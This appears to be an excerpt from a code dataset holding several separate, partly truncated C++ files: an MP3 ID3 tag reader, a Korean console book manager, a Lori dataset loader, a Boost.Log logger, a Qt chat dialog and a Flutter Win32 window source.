TOOLS (ITEM PICKER, ID STACK TOOL)\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------",
    "#include <iostream>\n#include <stdlib.h>\n#include <string.h>\n#include \"types.h\"\n#include \"header.h\"\n#include <iomanip>\nusing namespace std;\n\nStatus read_and_validate_args(char **argv, Music *MP3)\n{\n    if (strcmp(strstr(argv[2], \".\"), \".mp3\") == 0)\n    {\n        MP3->src_file_fname = argv[2];\n    }\n    else\n    {\n        return e_failure;\n    }\n    return e_success;\n}\n\nStatus open_files(int argc, char **argv, Music *MP3)\n{\n    if (argc >= 2)\n    {\n        MP3->fptr_src_file = fopen(argv[2], \"r\");\n    }\n    if (MP3->fptr_src_file == NULL)\n    {\n        cout << \"Failed to open the file \" << endl;\n        return e_failure;\n    }\n    return e_success;\n}\n\nStatus Check_ID3_Tag(Music *MP3)\n{\n    fread(MP3->ID3_Tag, 3, sizeof(char), MP3->fptr_src_file);\n    if (MP3->ID3_Tag[0] == 'I' && MP3->ID3_Tag[1] == 'D' && MP3->ID3_Tag[2] == '3')\n    {\n        cout << \"ID3 Tag is \" << MP3->ID3_Tag << endl;\n    }\n    else\n    {\n        return e_failure;\n    }\n    return e_success;\n}\n\nStatus Check_Version_Tag(Music *MP3)\n{\n    fseek(MP3->fptr_src_file, 3, SEEK_SET);\n    fread(MP3->Version_Tag, 3, sizeof(char), MP3->fptr_src_file);\n    if (MP3->Version_Tag[0] == 0x03 && MP3->Version_Tag[1] == 0x00 && MP3->Version_Tag[2] == 0x00)\n    {\n        cout << \"The version Tag is \" << MP3->Version_Tag[0] << MP3->Version_Tag[1] << MP3->Version_Tag[2] << endl;\n    }\n    else\n    {\n        return e_failure;\n    }\n    return e_success;\n}\n\nStatus Check_Extension(char **argv, Music *MP3)\n{\n    if (strcmp(strstr(argv[2], \".\"), \".mp3\") == 0)\n    {\n        cout << \"The extension is \" << strstr(argv[2], \".\") << endl;\n    }\n    else\n    {\n        return e_failure;\n    }\n    return e_success;\n}\n\nStatus get_and_display_data(const char *frame_descriptions[], const char *frame_ids[], char *frame_Id, char **tag, uint *tag_size, Music *MP3)\n{\n    static int flag = 0;\n    if (flag == 0)\n    {\n        cout << \"------------------------------------\" << endl;\n        cout << setw(30) << \"MP3 File Details\" << endl;\n        cout << \"------------------------------------\" << endl;\n        flag = 1;\n    }\n\n    size_t count;\n    long current_position = ftell(MP3->fptr_src_file);\n    count = fread(frame_Id, 1, 4, MP3->fptr_src_file);\n    if (count != 4)\n    {\n        cout << \"Failed to read the frame Id\" << endl;\n        return e_failure;\n    }\n    frame_Id[4] = '\\0';  // Null-terminate the string\n    \n    for (int i = 0; frame_ids[i] != NULL; i++)\n    {\n        if (strcmp(frame_Id, frame_ids[i]) == 0)\n        {\n            uint size_bytes;\n            count = fread(&size_bytes, 1, 4, MP3->fptr_src_file);\n            if (count != 4)\n            {\n                cout << \"Failed to read the size\" << endl;\n                return e_failure;\n            }\n\n            // Reverse the bytes to get the correct tag size (big-endian to little-endian)\n            *tag_size = ((size_bytes & 0xFF) << 24) |\n                        ((size_bytes & 0xFF00) << 8) |\n                        ((size_bytes & 0xFF0000) >> 8) |\n                        ((size_bytes >> 24) & 0xFF);\n\n            *tag = (char *)malloc((*tag_size + 1) * sizeof(char));\n            if (*tag == NULL)\n            {\n                cout << \"Failed to allocate the memory for the tag\" << endl;\n                return e_failure;\n            }\n\n            // Skip the frame flags\n            fseek(MP3->fptr_src_file, 3, SEEK_CUR);\n\n            // Read the content\n            count = fread(*tag, 1, *tag_size, MP3->fptr_src_file);\n            if (count < *tag_size)\n            {\n                cout << \"Failed to read the content\" << endl;\n                free(*tag);\n                *tag = NULL;\n                return e_failure;\n            }\n            (*tag)[*tag_size - 1] = '\\0';  // Null-terminate the tag\n\n            cout << frame_descriptions[i] << \": \" << *tag << endl;\n\n            long next_frame_position = ftell(MP3->fptr_src_file);\n            fseek(MP3->fptr_src_file, next_frame_position - 1, SEEK_SET);\n            break;\n        }\n    }\n\n    return e_success;\n}\n\nStatus Check_Tag(Music *MP3)\n{\n    fseek(MP3->fptr_src_file, 0, SEEK_SET);\n    fseek(MP3->fptr_src_file, 10, SEEK_SET);\n    Status ret;\n\n    const char* frame_descriptions[] = {\"TITLE\", \"ARTIST_NAME\", \"ALBUM_NAME\", \"YEAR\", \"CONTENT\", \"COMMENTS\", NULL};\n    const char* frame_ids[] = {\"TIT2\", \"TPE1\", \"TALB\", \"TYER\", \"TCON\", \"COMM\", NULL};\n    MP3->size_count = sizeof(frame_ids) / sizeof(frame_ids[0]) - 1;\n    for (int i = 0; i < MP3->size_count; i++)\n    {\n        char frame_Id[5] = {0};\n        char *tag = NULL;\n        uint tag_size = 0;\n        ret = get_and_display_data(frame_descriptions, frame_ids, frame_Id, &tag, &tag_size, MP3);\n        free(tag);\n    }\n\n    cout << \"------------------------------------------------\" << endl;\n    fclose(MP3->fptr_src_file);\n    return e_success;\n}\n\n\nStatus view(Music *MP3)\n{\n    if (Check_Tag(MP3) == e_success)\n    {\n        cout << \"Successfully checked the Tag\" << endl;\n    }\n    else\n    {\n        cout << \"Failed",
    "#include <iostream>\n#include <vector>\n#include <string>\n\nusing namespace std; // namespace std \uc0ac\uc6a9\n\nclass Book\n{\npublic:\n    string title;\n    string author;\n\n    Book(const string& title, const string& author)\n        : title(title), author(author) {}\n};\n\nclass BookManager\n{\nprivate:\n    vector<Book> books; // \ucc45 \ubaa9\ub85d \uc800\uc7a5\n\npublic:\n    // \ucc45 \ucd94\uac00 \uba54\uc11c\ub4dc\n    void addBook(const string& title, const string& author)\n    {\n        books.push_back(Book(title, author)); // push_back \uc0ac\uc6a9\n        cout << \"\ucc45\uc774 \ucd94\uac00\ub418\uc5c8\uc2b5\ub2c8\ub2e4: \" << title << \" by \" << author << endl;\n    }\n\n    // \ubaa8\ub4e0 \ucc45 \ucd9c\ub825 \uba54\uc11c\ub4dc\n    void displayAllBooks() const\n    {\n        if (books.empty())\n        {\n            cout << \"\ud604\uc7ac \ub4f1\ub85d\ub41c \ucc45\uc774 \uc5c6\uc2b5\ub2c8\ub2e4.\" << endl;\n            return;\n        }\n\n        cout << \"\ud604\uc7ac \ub3c4\uc11c \ubaa9\ub85d:\" << endl;\n        // \uc77c\ubc18\uc801\uc778 for\ubb38 \uc0ac\uc6a9\n        for (size_t i = 0; i < books.size(); i++)\n        {\n            cout << \"- \" << books[i].title << \" by \" << books[i].author << endl;\n        }\n    }\n\n    void searchBook(int option, std::string input) const\n    {\n        // option 1 : \ucc45 \uc81c\ubaa9 \uac80\uc0c9\n        // option 2 : \uc791\uac00 \uac80\uc0c9\n\n        for (int i = 0; i < books.size(); ++i)\n        {\n            // \ucc45 \uc81c\ubaa9 \uac80\uc0c9\n            if (1 == option)\n            {\n                if (books[i].title == input)\n                {\n                    cout << \"- \" << books[i].title << \" by \" << books[i].author << endl;\n                    return;\n                }\n            }\n            // \uc791\uac00 \uac80\uc0c9\n            else if (2 == option)\n            {\n                if (books[i].author == input)\n                {\n                    cout << \"- \" << books[i].title << \" by \" << books[i].author << endl;\n                    return;\n                }\n            }\n        }\n\n        std::cout << \"\uc785\ub825\ud558\uc2e0 \uc870\uac74\uc758 \ucc45\uc744 \ucc3e\uc744 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4.\" << std::endl;\n    }\n};\n\nint main() {\n\n    BookManager manager;\n\n    // \ub3c4\uc11c\uad00 \uad00\ub9ac \ud504\ub85c\uadf8\ub7a8\uc758 \uae30\ubcf8 \uba54\ub274\ub97c \ubc18\ubcf5\uc801\uc73c\ub85c \ucd9c\ub825\ud558\uc5ec \uc0ac\uc6a9\uc790 \uc785\ub825\uc744 \ucc98\ub9ac\ud569\ub2c8\ub2e4.\n    // \ud504\ub85c\uadf8\ub7a8 \uc885\ub8cc\ub97c \uc120\ud0dd\ud558\uae30 \uc804\uae4c\uc9c0 \uacc4\uc18d \ub3d9\uc791\ud569\ub2c8\ub2e4.\n    while (true)\n    {\n        cout << \"\\n\ub3c4\uc11c\uad00 \uad00\ub9ac \ud504\ub85c\uadf8\ub7a8\" << endl;\n        cout << \"1. \ucc45 \ucd94\uac00\" << endl;         // \ucc45 \uc815\ubcf4\ub97c \uc785\ub825\ubc1b\uc544 \ucc45 \ubaa9\ub85d\uc5d0 \ucd94\uac00\n        cout << \"2. \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\" << endl;    // \ud604\uc7ac \ucc45 \ubaa9\ub85d\uc5d0 \uc788\ub294 \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\n        cout << \"3. \uc885\ub8cc\" << endl;            // \ud504\ub85c\uadf8\ub7a8 \uc885\ub8cc\n        std::cout << \"4. \uac80\uc0c9\" << std::endl;  // \ucc45 \uac80\uc0c9\n        cout << \"\uc120\ud0dd: \";\n\n        int choice; // \uc0ac\uc6a9\uc790\uc758 \uba54\ub274 \uc120\ud0dd\uc744 \uc800\uc7a5\n        cin >> choice;\n\n        if (choice == 1)\n        {\n            // 1\ubc88 \uc120\ud0dd: \ucc45 \ucd94\uac00\n            // \uc0ac\uc6a9\uc790\ub85c\ubd80\ud130 \ucc45 \uc81c\ubaa9\uacfc \uc800\uc790\uba85\uc744 \uc785\ub825\ubc1b\uc544 BookManager\uc5d0 \ucd94\uac00\ud569\ub2c8\ub2e4.\n            string title, author;\n            cout << \"\ucc45 \uc81c\ubaa9: \";\n            cin.ignore(); // \uc774\uc804 \uc785\ub825\uc758 \uc794\uc5ec \ubc84\ud37c\ub97c \uc81c\uac70\n            getline(cin, title); // \uc81c\ubaa9 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\n            cout << \"\ucc45 \uc800\uc790: \";\n            getline(cin, author); // \uc800\uc790\uba85 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\n            manager.addBook(title, author); // \uc785\ub825\ubc1b\uc740 \ucc45 \uc815\ubcf4\ub97c \ucd94\uac00\n        }\n        else if (choice == 2)\n        {\n            // 2\ubc88 \uc120\ud0dd: \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\n            // \ud604\uc7ac BookManager\uc5d0 \uc800\uc7a5\ub41c \ucc45 \ubaa9\ub85d\uc744 \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            manager.displayAllBooks();\n        }\n        else if (choice == 3)\n        {\n            // 3\ubc88 \uc120\ud0dd: \uc885\ub8cc\n            // \ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud558\uace0 \uc0ac\uc6a9\uc790\uc5d0\uac8c \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            cout << \"\ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud569\ub2c8\ub2e4.\" << endl;\n            break; // while \ub8e8\ud504 \uc885\ub8cc\n        }\n        else if (choice == 4)\n        {\n            int option = -1;\n            std::string input = \"\";\n            // 4\ubc88 \uc120\ud0dd: \uac80\uc0c9\n            std::cout << \"\uac80\uc0c9\uc870\uac74\uc744 \uc124\uc815\ud574\uc8fc\uc138\uc694 (1:\ucc45\uc81c\ubaa9, 2:\uc791\uac00) : \";\n            std::cin >> option;\n            std::cout << \"\uac80\uc0c9 : \";\n            std::cin >> input;\n            manager.searchBook(option, input);\n        }\n        else\n        {\n            // \uc798\ubabb\ub41c \uc785\ub825 \ucc98\ub9ac\n            // \uba54\ub274\uc5d0 \uc5c6\ub294 \ubc88\ud638\ub97c \uc785\ub825\ud588\uc744 \uacbd\uc6b0 \uacbd\uace0 \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            cout << \"\uc798\ubabb\ub41c \uc785\ub825\uc785\ub2c8\ub2e4. \ub2e4\uc2dc \uc2dc\ub3c4\ud558\uc138\uc694.\" << endl;\n        }\n    }\n\n    return 0; // \ud504\ub85c\uadf8\ub7a8 \uc815\uc0c1 \uc885\ub8cc\n}\n",
    "#include \"getData.hpp\"\n#include \"../../common/Transforms/Euler_to_Ra2b.hpp\"\n#include <armadillo>\n#include <filesystem>\n#include <iostream>\n\n\n/*---------------------------------------------------\nRodrigo Mungu\u00eda 2022.\n\nGet data from Lori dataset: https://shimo.im/docs/HhJj6XHYhdRQ6jjk/read\n-----------------------------------------------------\n*/\n\nusing namespace std;\nusing namespace cv;\n\n\nstring Odometry_dat = \"odom.txt\";\nstring Cam_dir = \"color/\";\nstring Cam_list = \"color.txt\";\n\n\n//-------------------------------------------------------------------------------------------------\n// get data from Lori dataset\nDATA getDataL(parameters &PAR)\n{\n\n string Dataset_dir = PAR.Dataset_path;\n \n DATA dat;\n  \n    static int flag_init = 0;\n    static vector<FRAME> dat_F;\n    static vector<ODOV> dat_V; \n    \n    static auto last_time_data = std::chrono::high_resolution_clock::now();\n    static double last_t = 10000000000000000;\n    \n    if (PAR.restart == true)\n    {      \n       flag_init = 0;\n       dat_F.clear();\n       dat_V.clear(); \n       \n       last_time_data = std::chrono::high_resolution_clock::now();\n       last_t = 10000000000000000;\n       PAR.restart = false; \n    }\n\n\n    \n    // load data from the text files ----------\n    // Execute only one time\n    if (flag_init == 0)\n    {   \n        ifstream data_file_D;\n        ifstream data_file_F;\n            \n\n        data_file_D.open(Dataset_dir + Odometry_dat); // frames file\n        data_file_F.open(Dataset_dir + Cam_list);\n        \n\n        string lineV;\n        vector<string> v;\n        getline(data_file_D,lineV); // for \"jump\" the header\n        while ( getline(data_file_D,lineV) )\n        {  \n            stringstream ss(lineV); \n            ODOV odo;\n            vector<string> v_V;\n            while( ss.good() ) // parse each comma-separated element into a vector of strings\n            {\n                string substr;\n                getline( ss, substr, ' ' );\n                v_V.push_back( substr );\n            }\n           // gps.time = stoi(v_G[0]);\n            long int t_f = (stod(v_V[0])*1000000);\n            odo.time = (long int)t_f%10000000000;\n            odo.linear_vel = stod(v_V[8]);\n            odo.angular_vel = stod(v_V[13]);\n            if(odo.time  > PAR.init_time) dat_V.push_back(odo);    \n        }\n        \n\n        string lineF;\n       \n        while ( getline(data_file_F,lineF) )\n        {  \n           stringstream ss(lineF);\n           FRAME frame;\n           vector<string> v_F;\n           \n           while( ss.good() ) // parse each comma-separated element into a vector of strings\n            {\n                string substr;\n                getline( ss, substr, ' ' );\n                v_F.push_back( substr );\n            }\n                    \n           long int t_f = (stod(v_F[0])*1000000);\n           frame.time = (long int)t_f%10000000000;   \n          \n           frame.image_file = v_F[1];\n            //int q = 10;\n           if(frame.time  > PAR.init_time) dat_F.push_back(frame);     \n\n\n        }\n\n        flag_init = 1;\n        data_file_D.close();\n        data_file_F.close();\n\n\n    }\n\n    //---------------------------------------------- \n    \n\n    int idx;\n    double current_t; \n    \n    long int times[2] = {dat_F[0].time,dat_V[0].time};\n    idx = distance(begin(times),min_element(begin(times), end(times)));\n    current_t = times[idx]; \n    \n\n    if ((dat_F.size() == 0) || (dat_V.size() == 0) )\n    {  \n     //cout << \"dataset: no more data\" << endl;\n     dat.data_type = \"NULL\";\n     return dat;\n    } \n\n        \n        // compute actual time elapsed from the last time a data was query\n        auto current_time = std::chrono::high_resolution_clock::now();\n        auto elapsed = std::chrono::duration_cast<std::chrono::nanoseconds>(current_time - last_time_data); \n        double delta_t = elapsed.count() * 1e-9; \n        //\n        double elapsed_ds = (current_t - last_t)/1000000;\n        //double elapsed_ds = (current_t - last_t);\n\n        \n\n        //cout << elapsed_ds << endl;\n        \n        dat.data_type = \"\";         \n\n        if(delta_t*PAR.x_vel_run_time > elapsed_ds)\n        { \n                //cout << delta_t << endl;\n                if (idx == 0)\n                {   \n                    \n                    dat.data_type = \"frame\";\n                    dat.time = dat_F[0].time;\n                    \n                    dat.frame = dat_F[0];\n                    // read image:  it can be move up to the parse section\n                    cv::Mat image;\n                    image = imread(Dataset_dir + dat_F[0].image_file, IMREAD_GRAYSCALE  );\n\n                     Mat image_down;\n                    cv::resize(image, image_down, Size(424, 240), INTER_LINEAR);\n\n                    dat.frame.image = image_down;\n                    dat.frame.range = -1;                            \n                    \n                    dat_F.erase(dat_F.begin());\n                    \n                }\n                else if(idx == 1)\n            ",
    "#include \"log.hpp\"\n\n#include \"boost/log/attributes/mutable_constant.hpp\"\n#include \"boost/log/core/core.hpp\"\n#include \"boost/log/core/record.hpp\"\n#include \"boost/log/expressions/attr.hpp\"\n#include \"boost/log/expressions/formatters/stream.hpp\"\n#include \"boost/log/sinks/text_file_backend.hpp\"\n\n#include \"error.hpp\"\n#include \"util.hpp\"\n\nnamespace util {\nnamespace expr\t   = boost::log::expressions;\nnamespace keywords = boost::log::keywords;\nnamespace sinks\t   = boost::log::sinks;\nLogger::Logger(const std::string &file_path) {\n\t// New attributes that hold filename and line number for trvial logger.\n\t_slg.add_attribute(\"File\", log_attrs::mutable_constant<std::string>(\"\"));\n\t_slg.add_attribute(\"Line\", log_attrs::mutable_constant<int>(0));\n\t_slg.add_attribute(\"Function\", log_attrs::mutable_constant<std::string>(\"\"));\n\t_slg.add_attribute(\"SinkName\", log_attrs::constant<std::string>(file_path));\n}\n\noutcome::result<void> Logger::init_default(log_level svl, bool file_enabled, bool console_enabled) noexcept {\n\ttry {\n\t\tstd::optional<fs::path> log_path = std::nullopt;\n\t\tif (file_enabled) {\n#if defined(linux) || defined(WIN32)\n\t\t\tconst auto res = util::program_location();\n\t\t\tif (!res) {\n\t\t\t\treturn res.error();\n\t\t\t}\n\t\t\tlog_path = res.value().parent_path();\n#endif\n\t\t}\n\t\treturn init_default_sink(svl, log_path, console_enabled);\n\t} catch (const std::exception &e) {\n\t\treturn make_error_code(e);\n\t} catch (...) {\n\t\treturn make_error_code(Error::UNKNOWN_EXCEPTION);\n\t}\n}\n\noutcome::result<void> Logger::init_default_sink(log_level svl, const std::optional<fs::path> &log_path,\n\t\tbool isConsoleEnabled) {\n\ttry {\n\t\t// New attributes that hold filename and line number for trvial logger.\n\t\tlogging::trivial::logger::get().add_attribute(\"File\",\n\t\t\t\tlog_attrs::mutable_constant<std::string>(\"\"));\n\t\tlogging::trivial::logger::get().add_attribute(\"Line\", log_attrs::mutable_constant<int>(0));\n\t\tlogging::trivial::logger::get().add_attribute(\"Function\",\n\t\t\t\tlog_attrs::mutable_constant<std::string>(\"\"));\n\n\t\t/* Add File Log*/\n\t\tif (log_path) {\n\t\t\t// std::error_code err;\n\t\t\tstd::string file_path = log_path.value().string() + \"/log/default\";\n\t\t\tlogging::trivial::logger::get().add_attribute(\"SinkName\",\n\t\t\t\t\tlog_attrs::constant<std::string>(file_path));\n\t\t\toutcome::result<void> res = add_file_sink(file_path, svl);\n\t\t\tif (!res) {\n\t\t\t\treturn res;\n\t\t\t}\n\t\t}\n\n\t\t/* Add Console Log*/\n\t\tif (isConsoleEnabled) {\n\t\t\tlogging::add_console_log(\n\t\t\t\t\tstd::cout,\n\t\t\t\t\tkeywords::format =\n\t\t\t\t\t\t\t(expr::stream << expr::format_date_time<boost::posix_time::ptime>(\n\t\t\t\t\t\t\t\t\t\t\t\t\t \"TimeStamp\", \"%Y-%m-%d_%H:%M:%S.%f\")\n\t\t\t\t\t\t\t\t\t\t  << \": <\" << boost::log::trivial::severity << \"> \" << '['\n\t\t\t\t\t\t\t\t\t\t  << expr::attr<std::string>(\"File\") << ':' << expr::attr<int>(\"Line\")\n\t\t\t\t\t\t\t\t\t\t  << \"]\"\n\t\t\t\t\t\t\t\t\t\t  << \"[\" << expr::attr<std::string>(\"Function\") << \"] \"\n\t\t\t\t\t\t\t\t\t\t  << expr::smessage));\n\t\t}\n\t\t// register to common attributes:\n\t\tlogging::add_common_attributes();\n\t\t// set severity:\n\t\tlogging::core::get()->set_filter(logging::trivial::severity >= svl);\n\t} catch (const std::exception &e) {\n\t\treturn make_error_code(e);\n\t} catch (...) {\n\t\treturn make_error_code(Error::UNKNOWN_EXCEPTION);\n\t}\n\treturn outcome::success();\n}\n\noutcome::result<void> Logger::add_file_sink(const std::string &file_path, log_level svl) {\n\ttry {\n\t\tboost::shared_ptr<sinks::text_file_backend> backend =\n\t\t\t\tboost::make_shared<sinks::text_file_backend>(\n\t\t\t\t\t\tkeywords::file_name\t\t\t\t= file_path + \"_%N.log\",\n\t\t\t\t\t\tkeywords::rotation_size\t\t\t= 5 * 1024 * 1024,\n\t\t\t\t\t\tkeywords::open_mode\t\t\t\t= std::ios_base::out | std::ios_base::app,\n\t\t\t\t\t\tkeywords::enable_final_rotation = false);\n\t\tbackend->auto_flush();\n\t\t// wrap backend with the sink front end\n\t\tusing SinkT = sinks::synchronous_sink<sinks::text_file_backend>;\n\t\tboost::shared_ptr<SinkT> sink_front(new SinkT(backend));\n\t\tsink_front->set_formatter(\n\t\t\t\texpr::stream << expr::format_date_time<boost::posix_time::ptime>(\"TimeStamp\",\n\t\t\t\t\t\t\t\t\t\t\"%Y-%m-%d_%H:%M:%S.%f\")\n\t\t\t\t\t\t\t << \": <\" << boost::log::trivial::severity << \"> \" << '['\n\t\t\t\t\t\t\t << expr::attr<std::string>(\"File\") << ':' << expr::attr<int>(\"Line\") << \"]\"\n\t\t\t\t\t\t\t << \"[\" << expr::attr<std::string>(\"Function\") << \"] \" << expr::smessage);\n\t\tsink_front->set_filter(expr::attr<std::string>(\"SinkName\") == file_path && logging::trivial::severity >= svl);\n\t\tlogging::core::get()->add_sink(sink_front);\n\t} catch (const std::exception &e) {\n\t\treturn make_error_code(e);\n\t} catch (...) {\n\t\treturn make_error_code(Error::UNKNOWN_EXCEPTION);\n\t}\n\treturn outcome::success();\n}\n\n} // namespace util",
    "#include \"chat_dialog.h\"\n#include \"ui_chat_dialog.h\"\n#include<QRandomGenerator>\n\n#include<QAction>\n#include<QTextEdit>\n#include<QTcpSocket>\n#include<chatuserwid.h>\nChat_Dialog::Chat_Dialog(QWidget *parent)\n    : QDialog(parent)\n    , ui(new Ui::Chat_Dialog)\n{\n    ui->setupUi(this);\n    QAction *searchAction = new QAction(ui->search_edit);\n    searchAction->setIcon(QIcon(\":/res/search.png\"));\n    ui->search_edit->addAction(searchAction,QLineEdit::LeadingPosition);\n    ui->search_edit->setPlaceholderText(QStringLiteral(\"\u641c\u7d22\"));\n    // \u521b\u5efa\u4e00\u4e2a\u6e05\u9664\u52a8\u4f5c\u5e76\u8bbe\u7f6e\u56fe\u6807\n    QAction *clearAction = new QAction(ui->search_edit);\n    clearAction->setIcon(QIcon(\":/res/close_transparent.png\"));\n    // \u521d\u59cb\u65f6\u4e0d\u663e\u793a\u6e05\u9664\u56fe\u6807\n    // \u5c06\u6e05\u9664\u52a8\u4f5c\u6dfb\u52a0\u5230LineEdit\u7684\u672b\u5c3e\u4f4d\u7f6e\n    ui->search_edit->addAction(clearAction, QLineEdit::TrailingPosition);\n    // \u5f53\u9700\u8981\u663e\u793a\u6e05\u9664\u56fe\u6807\u65f6\uff0c\u66f4\u6539\u4e3a\u5b9e\u9645\u7684\u6e05\u9664\u56fe\u6807\n    connect(ui->search_edit, &QLineEdit::textChanged, [clearAction](const QString &text) {\n        if (!text.isEmpty()) {\n            clearAction->setIcon(QIcon(\":/res/close_search.png\"));\n        } else {\n            clearAction->setIcon(QIcon(\":/res/close_transparent.png\")); // \u6587\u672c\u4e3a\u7a7a\u65f6\uff0c\u5207\u6362\u56de\u900f\u660e\u56fe\u6807\n        }\n    });\n    // \u8fde\u63a5\u6e05\u9664\u52a8\u4f5c\u7684\u89e6\u53d1\u4fe1\u53f7\u5230\u69fd\u51fd\u6570\uff0c\u7528\u4e8e\u6e05\u9664\u6587\u672c\n    connect(clearAction, &QAction::triggered, [this, clearAction]() {\n        ui->search_edit->clear();\n        clearAction->setIcon(QIcon(\":/res/close_transparent.png\")); // \u6e05\u9664\u6587\u672c\u540e\uff0c\u5207\u6362\u56de\u900f\u660e\u56fe\u6807\n        ui->search_edit->clearFocus();\n        //\u6e05\u9664\u6309\u94ae\u88ab\u6309\u4e0b\u5219\u4e0d\u663e\u793a\u641c\u7d22\u6846\n        //ShowSearch(false);\n    });\n    ui->search_edit->SetMaxLength(15);\n\n//    connect(ui->chat_user_list,&ChatUserList::sig_loading_chat_user,this,&Chat_Dialog::slot_loading_chat_user);//gaidon\n\n    addChatUSerList();\n}\n\nChat_Dialog::~Chat_Dialog()\n{\n    if (socket->isOpen()) {\n            socket->disconnectFromHost();\n        }\n    delete socket;\n    delete ui;\n}\n\nstd::vector<QString>  strs ={\"hello world !\",\n                             \"nice to meet u\",\n                             \"New year\uff0cnew life\",\n                             \"You have to love yourself\",\n                             \"My love is written in the wind ever since the whole world is you\"};\n\nstd::vector<QString> heads = {\n    \":/png/xyy.jpg\",\n    \":/png/fyy.jpg\",\n    \":/png/myy.jpg\",\n    \":/png/lyy.jpg\",\n    \":/png/htl.jpg\",\n    \":/png/xsg.jpg\",\n    \":/png/hds.jpg\"\n};\n\nstd::vector<QString> names = {\n    \"\u559c\u6d0b\u6d0b\",\n    \"\u6cb8\u7f8a\u7f8a\",\n    \"\u7f8e\u7f8a\u7f8a\",\n    \"\u61d2\u7f8a\u7f8a\",\n    \"\u7070\u592a\u72fc\",\n    \"\u6f47\u6d12\u54e5\",\n    \"\u9ed1\u5927\u5e05\"\n};//\u6d4b\u8bd5\n\n\n\n\nvoid Chat_Dialog::addChatUSerList()\n{\n    // \u521b\u5efaQListWidgetItem\uff0c\u5e76\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u7684widget\n    for(int i = 0; i < 13; i++){\n        int randomValue = QRandomGenerator::global()->bounded(100); // \u751f\u62100\u523099\u4e4b\u95f4\u7684\u968f\u673a\u6574\u6570\n        int str_i = randomValue%strs.size();\n        int head_i = randomValue%heads.size();\n        int name_i = randomValue%names.size();\n\n        auto *chat_user_wid = new ChatUserWid();\n        chat_user_wid->SetInfo(names[name_i], heads[head_i], strs[str_i]);\n        QListWidgetItem *item = new QListWidgetItem;\n        //qDebug()<<\"chat_user_wid sizeHint is \" << chat_user_wid->sizeHint();\n        item->setSizeHint(chat_user_wid->sizeHint());\n        ui->chat_user_list->addItem(item);\n        ui->chat_user_list->setItemWidget(item, chat_user_wid);\n    }\n}\n\nvoid Chat_Dialog::on_chat_edit_textChanged()\n{\n    QString currentText = ui->chat_edit->toPlainText();\n\n    qDebug() << \"Current Text:\" << currentText;\n\n    Send_data = currentText;\n}\n\nvoid Chat_Dialog::on_send_btn_clicked()\n{\n    if (socket->isOpen() && !Send_data.isEmpty()) {\n           QByteArray data = Send_data.toUtf8();\n           socket->write(data + '\\n');  // \u6dfb\u52a0\u6362\u884c\u7b26\u4fbf\u4e8e\u670d\u52a1\u5668\u89e3\u6790\n           socket->flush();\n       }\n}\n\nvoid Chat_Dialog::on_readyRead()\n{\n    while (socket->canReadLine()) {\n        QString message = socket->readLine().trimmed();\n        ui->listWidget->addItem(\"Server: \" + message);\n    }\n}\n\nvoid Chat_Dialog::on_disconnected()\n{\n    qDebug() << \"Disconnected from server!\";\n    ui->listWidget->addItem(\"Disconnected from server!\");\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    